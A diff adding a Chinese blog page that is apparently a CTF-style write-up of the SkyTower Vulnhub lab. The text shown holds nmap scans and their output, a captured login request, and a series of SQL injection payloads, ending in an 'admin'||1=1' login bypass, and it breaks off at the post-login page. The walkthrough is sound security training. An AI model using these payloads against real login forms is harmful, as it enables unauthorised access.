@@ -1,0 +1,514 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="大一最后自己打的靶场，还是有点难度的"><title>SkyTower Vulunhub靶场复现-重走来时路3</title><link rel=canonical href=https://ke1thli.github.io/p/skytower-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="SkyTower Vulunhub靶场复现-重走来时路3"><meta property='og:description' content="大一最后自己打的靶场，还是有点难度的"><meta property='og:url' content='https://ke1thli.github.io/p/skytower-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-07-19T00:00:00+00:00'><meta property='article:modified_time' content='2026-07-19T00:00:00+00:00'><meta name=twitter:title content="SkyTower Vulunhub靶场复现-重走来时路3"><meta name=twitter:description content="大一最后自己打的靶场，还是有点难度的"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#注意事项>注意事项</a></li><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞扫描>漏洞扫描</a></li><li><a href=#先测试sql注入的可能以及原因>先测试sql注入的可能以及原因</a></li><li><a href=#sql注入测试>SQL注入测试</a></li><li><a href=#注入成功获得提示需要利用22端口ssh登陆>注入成功获得提示，需要利用22端口ssh登陆</a></li><li><a href=#利用3128端口当跳板尝试ssh登陆>利用3128端口当跳板，尝试ssh登陆</a><ol><li><a href=#第一次打这个靶场在这里遇到的问题>第一次打这个靶场，在这里遇到的问题</a></li></ol></li><li><a href=#先尝试提权失败>先尝试提权&ndash;失败</a><ol><li><a href=#先尝试sudo提权>先尝试sudo提权</a></li><li><a href=#再尝试suid提权>再尝试suid提权</a></li></ol></li><li><a href=#重新信息收集查看网站源码>重新信息收集查看网站源码</a></li><li><a href=#进行数据枚举获取其他用户信息>进行数据枚举获取其他用户信息</a></li><li><a href=#横向移动到-sara-用户>横向移动到 sara 用户</a></li><li><a href=#再次进行sudo提权>再次进行sudo提权</a></li><li><a href=#获取root目录下的flag>获取root目录下的flag</a></li><li><a href=#总结>总结</a><ol><li><a href=#攻击路径回顾>攻击路径回顾</a></li><li><a href=#关于-ssh-退出的说明>关于 SSH 退出的说明</a></li><li><a href=#本靶场涉及知识点>本靶场涉及知识点</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/skytower-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/>SkyTower Vulunhub靶场复现-重走来时路3</a></h2><h3 class=article-subtitle>大一最后自己打的靶场，还是有点难度的</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-07-19T00:00:00Z>Sunday, July 19, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#注意事项>注意事项</a></li><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞扫描>漏洞扫描</a></li><li><a href=#先测试sql注入的可能以及原因>先测试sql注入的可能以及原因</a></li><li><a href=#sql注入测试>SQL注入测试</a></li><li><a href=#注入成功获得提示需要利用22端口ssh登陆>注入成功获得提示，需要利用22端口ssh登陆</a></li><li><a href=#利用3128端口当跳板尝试ssh登陆>利用3128端口当跳板，尝试ssh登陆</a><ol><li><a href=#第一次打这个靶场在这里遇到的问题>第一次打这个靶场，在这里遇到的问题</a></li></ol></li><li><a href=#先尝试提权失败>先尝试提权&ndash;失败</a><ol><li><a href=#先尝试sudo提权>先尝试sudo提权</a></li><li><a href=#再尝试suid提权>再尝试suid提权</a></li></ol></li><li><a href=#重新信息收集查看网站源码>重新信息收集查看网站源码</a></li><li><a href=#进行数据枚举获取其他用户信息>进行数据枚举获取其他用户信息</a></li><li><a href=#横向移动到-sara-用户>横向移动到 sara 用户</a></li><li><a href=#再次进行sudo提权>再次进行sudo提权</a></li><li><a href=#获取root目录下的flag>获取root目录下的flag</a></li><li><a href=#总结>总结</a><ol><li><a href=#攻击路径回顾>攻击路径回顾</a></li><li><a href=#关于-ssh-退出的说明>关于 SSH 退出的说明</a></li><li><a href=#本靶场涉及知识点>本靶场涉及知识点</a></li></ol></li></ol></nav></details></aside><section class=article-content><h1 id=skytower-vulunhub靶场复现-重走来时路-3>SkyTower Vulunhub靶场复现-重走来时路 3</h1><h2 id=注意事项>注意事项</h2><p>靶场地址 <a class=link href=https://vulnhub.com/entry/skytower-1,96/ target=_blank rel=noopener>https://vulnhub.com/entry/skytower-1,96/</a></p><p>下载地址 <a class=link href=https://download.vulnhub.com/skytower/SkyTower.zip target=_blank rel=noopener>https://download.vulnhub.com/skytower/SkyTower.zip</a></p><p>SkyTower 下载后的虚拟机文件无法直接导入 VMware。可以先在 VirtualBox 中导入，再导出为 OVA 格式，之后即可在 VMware 中正常导入</p><p>启动靶场虚拟机介绍</p><p>Welcome to the SkyTower, try to gain access
+to the flag.txt file in the /root/ directory</p><h2 id=主机发现>主机发现</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24 
+</span></span></code></pre></td></tr></table></div></div><p>得知 10.10.10.132 为 skytower 靶机ip地址</p><h2 id=端口扫描>端口扫描</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SkyTower<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate <span class=m>1000</span> -p- 10.10.10.132  
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-19 12:34 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.132
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00012s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE    SERVICE
+</span></span><span class=line><span class=cl>22/tcp   filtered ssh
+</span></span><span class=line><span class=cl>80/tcp   open     http
+</span></span><span class=line><span class=cl>3128/tcp open     squid-http
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SkyTower<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sT -sV -sC -O -p 22,80,3128 10.10.10.132 
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-19 12:35 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.132
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00068s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>PORT     STATE    SERVICE    VERSION
+</span></span><span class=line><span class=cl>22/tcp   filtered ssh
+</span></span><span class=line><span class=cl>80/tcp   open     http       Apache httpd 2.2.22 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.2.22 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
+</span></span><span class=line><span class=cl>3128/tcp open     http-proxy Squid http proxy 3.1.20
+</span></span><span class=line><span class=cl><span class=p>|</span> http-open-proxy: Potentially OPEN proxy.
+</span></span><span class=line><span class=cl><span class=p>|</span>_Methods supported: GET HEAD
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: ERROR: The requested URL could not be retrieved
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: squid/3.1.20
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:A7:6A:77 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Linux 3.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3
+</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>状态</th><th>服务</th><th>版本</th><th>备注</th></tr></thead><tbody><tr><td>22/tcp</td><td>filtered</td><td>SSH</td><td>-</td><td>防火墙过滤，无法直接访问</td></tr><tr><td>80/tcp</td><td>open</td><td>HTTP</td><td>Apache 2.2.22 (Debian)</td><td>主要攻击面</td></tr><tr><td>3128/tcp</td><td>open</td><td>HTTP Proxy</td><td>Squid 3.1.20</td><td>可用于绕过防火墙的代理服务</td></tr></tbody></table></div><p>22端口被过滤的可能是nmap 发送的包直接被防火墙拦截，没有返回rst包，若想利用 SSH 服务，需要先绕过防火墙对 22 端口的访问限制</p><p>3128 Squid 代理 是一个http正向代理，如果靶机允许本地回环地址访问22端口，我们就可以通过修改proxychain去绕过这个22端口的过滤</p><h2 id=漏洞扫描>漏洞扫描</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SkyTower<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --script<span class=o>=</span>vuln -p22,80,3128 10.10.10.132  
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-19 12:38 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.132
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00087s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>PORT     STATE    SERVICE
+</span></span><span class=line><span class=cl>22/tcp   filtered ssh
+</span></span><span class=line><span class=cl>80/tcp   open     http
+</span></span><span class=line><span class=cl><span class=p>|</span> http-enum: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  /login.php: Possible admin folder
+</span></span><span class=line><span class=cl><span class=p>|</span> http-csrf: 
+</span></span><span class=line><span class=cl><span class=p>|</span> Spidering limited to: <span class=nv>maxdepth</span><span class=o>=</span>3<span class=p>;</span> <span class=nv>maxpagecount</span><span class=o>=</span>20<span class=p>;</span> <span class=nv>withinhost</span><span class=o>=</span>10.10.10.132
+</span></span><span class=line><span class=cl><span class=p>|</span>   Found the following possible CSRF vulnerabilities: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.132:80/
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Form action: login.php
+</span></span><span class=line><span class=cl><span class=p>|</span> http-sql-injection: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   Possible sqli <span class=k>for</span> forms:
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form at path: /, form<span class=s1>&#39;s action: login.php. Fields that might be vulnerable:
+</span></span></span><span class=line><span class=cl><span class=s1>|_      email
+</span></span></span><span class=line><span class=cl><span class=s1>|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-stored-xss: Couldn<span class=err>&#39;</span>t find any stored XSS vulnerabilities.
+</span></span><span class=line><span class=cl>3128/tcp open     squid-http
+</span></span></code></pre></td></tr></table></div></div><p>访问 80 端口是一个登陆表单，爆出可能存在两个漏洞，sql注入和csrf</p><h2 id=先测试sql注入的可能以及原因>先测试sql注入的可能以及原因</h2><p>sql注入不需要登陆，可以直接通过登录框进行渗透</p><p>csrf 是跨站请求伪造，利用需要有两大条件</p><ol><li>必须先有一个有效的登陆会话，cookie/session</li><li>目标应该有修改密码的操作，且没有csrf token的保护</li></ol><p>既然明确了，我们先测试sql注入的可能，若 SQL 注入暂未获得进一步突破，可以重新回到信息收集阶段，对 Web 服务继续进行枚举</p><h2 id=sql注入测试>SQL注入测试</h2><p>对80端口进行抓包,然后发送到重放器</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /login.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 10.10.10.132
+</span></span><span class=line><span class=cl>Content-Length: 18
+</span></span><span class=line><span class=cl>Cache-Control: max-age=0
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Origin: http://10.10.10.132
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class=line><span class=cl>Referer: http://10.10.10.132/
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>email=1&amp;password=1
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Date: Mon, 20 Jul 2026 01:20:01 GMT
+</span></span><span class=line><span class=cl>Server: Apache/2.2.22 (Debian)
+</span></span><span class=line><span class=cl>X-Powered-By: PHP/5.4.4-14+deb7u9
+</span></span><span class=line><span class=cl>Vary: Accept-Encoding
+</span></span><span class=line><span class=cl>Content-Length: 21
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Content-Type: text/html
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;br&gt;Login Failed&lt;/br&gt;
+</span></span></code></pre></td></tr></table></div></div><p>修改Email 的参数进行测试</p><p>参数如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin&#39;# 显示登陆失败
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#39;or &#39;1&#39;=1# 显示There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39; and password=&#39;1&#39;&#39; at line 1]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1&#39; 依旧语法错误There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39;&#39; at line 1]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#39;AND&#39;1&#39;LIKE&#39;1&#39; There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39;&#39; at line 1]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#39;a&#39; 依旧如上
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1||1登陆失败
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1||1=1 登陆失败
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>admin&#39;AND1=1# 语法错误
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1&#39; -- - 语法错误
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>admin&#39;||1=1 登陆成功
+</span></span></code></pre></td></tr></table></div></div><p>为什么最后的payload能成功，猜测 &rsquo; - &ndash; AND OR = NOT 均被过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;$_POST[&#39;</span><span class=n>email</span><span class=s1>&#39;]&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;$_POST[&#39;</span><span class=n>password</span><span class=s1>&#39;]&#39;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>根据登录逻辑推测，其后端 SQL 查询语句类似于：</p><p>把admin‘||1=1# 替换进去</p><p>原始语句</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=o>||</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=o>#</span><span class=s1>&#39; AND password = &#39;</span><span class=mi>1</span><span class=s1>&#39;
+</span></span></span></code></pre></td></tr></table></div></div><p>解析成</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=o>||</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>返回请求如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>**Welcome john@skytech.com  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**As you may know, SkyTech has ceased all international operations.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>To all our long term employees, we wish to convey our thanks for your dedication and hard work.  
